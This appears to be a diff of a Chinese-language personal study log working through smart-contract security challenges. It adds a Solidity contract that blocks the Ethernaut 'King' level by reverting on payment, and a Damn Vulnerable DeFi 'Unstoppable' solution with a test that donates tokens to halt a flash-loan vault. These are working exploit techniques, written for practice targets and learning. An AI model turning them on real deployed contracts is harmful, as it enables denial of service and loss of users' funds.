@@ -231,6 +231,7 @@ contract mine{
 
 要求成为king，阻止关卡重新声明王位
 
+
 ```
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
@@ -264,19 +265,82 @@ contract King {
 为了防止owner改变king，我们成为king之后，让这个transfer失败回滚.
 
 ```
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
 contract tobeking{
-    constructor() payable {
-    }
+
     receive() external payable {
         revert();
     }
-    function start(address king)public payable{
-         payable(king).transfer(msg.value);
+    function start(address payable king)public payable{
+         (bool success, ) = king.call{value:1000000000000000}("");
+         require(success);
     }
 }
 ```
 
-### 2024.09.01
+不过要注意的是，不写receive函数也可以达到目的，即没法直接收款。另外，在转账的时候，必须用call，注意把address标记为payable。
+
+### 2024.09.02
+#### damnvulnerabledefi - Unstoppable
+
+There’s a tokenized vault with a million DVT tokens deposited. It’s offering flash loans for free, until the grace period ends.
+
+To catch any bugs before going 100% permissionless, the developers decided to run a live beta in testnet. There’s a monitoring contract to check liveness of the flashloan feature.
+
+Starting with 10 DVT tokens in balance, show that it’s possible to halt the vault. It must stop offering flash loans.
+
+我们初始有10 token，要让闪电贷项目暂停，看监控合约代码可知，需要监控合约调用闪电贷时发生回滚：
+
+```
+function checkFlashLoan(uint256 amount) external onlyOwner {
+        require(amount > 0);
+        address asset = address(vault.asset());
+        try vault.flashLoan(this, asset, amount, bytes("")) {
+            emit FlashLoanStatus(true);
+        } catch {//这里，如果回滚就会暂停
+            emit FlashLoanStatus(false);
+            vault.setPause(true);
+            vault.transferOwnership(owner);
+        }
+    }
+```
+
+然后看flashLoan函数：
+
+```
+function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
+        external
+        returns (bool)
+    {
+        if (amount == 0) revert InvalidAmount(0);
+        if (address(asset) != _token) revert UnsupportedCurrency(); 
+        uint256 balanceBefore = totalAssets();
+        if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // 这里，如果返回false则会回滚
+        ......
+}
+
+    function convertToShares(uint256 assets) public view virtual returns (uint256) {
+        uint256 supply = totalSupply; // Saves an extra SLOAD if totalSupply is non-zero.
+
+        return supply == 0 ? assets : assets.mulDivDown(supply, totalAssets());// 一个是totalsuppy，一个是balance(this)，只要转账给合约即可，如：10*totalSupply/balance = 10*10eN/(10eN+1),
+    }
+```
+
+测试：
+
+```
+    function test_unstoppable() public checkSolvedByPlayer {
+        console.log(token.balanceOf(address(this)));
+        token.transfer(address(vault), 1e18);
+    }	
+```
+
+### 2024.09.03
+
+
+### 2024.09.04
 
 
 <!-- Content_END -->
